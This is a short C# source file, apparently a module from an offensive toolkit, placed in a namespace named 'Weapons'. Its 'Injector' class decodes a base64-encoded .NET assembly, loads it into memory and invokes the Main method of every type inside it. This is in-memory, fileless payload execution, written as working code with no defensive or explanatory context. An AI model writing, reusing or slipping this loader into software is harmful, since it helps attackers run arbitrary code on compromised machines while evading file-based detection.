using System;
using System.Reflection;
using System.Text;

namespace Weapons
{
    // In-Memory Injection
    class Injector
    {
        public static string Inject(string assemblyB64)
        {
            var bytes = Convert.FromBase64String(assemblyB64);
            var assembly = Assembly.Load(bytes);
            StringBuilder output = new StringBuilder();
            foreach (var type in assembly.GetTypes())
            {
                try
                {
                    output.AppendLine(String.Format("[*] Loaded Type {0}",type));
                    object instance = Activator.CreateInstance(type);
                    object[] args = new object[] { new string[] { "" } };
                
                    type.GetMethod("Main").Invoke(instance, args);
                }
                catch 
                {
                    output.AppendLine(String.Format("[*] Failed to Load Type {0}", type));
                }
            }
            return output.ToString();
        }
    }
}
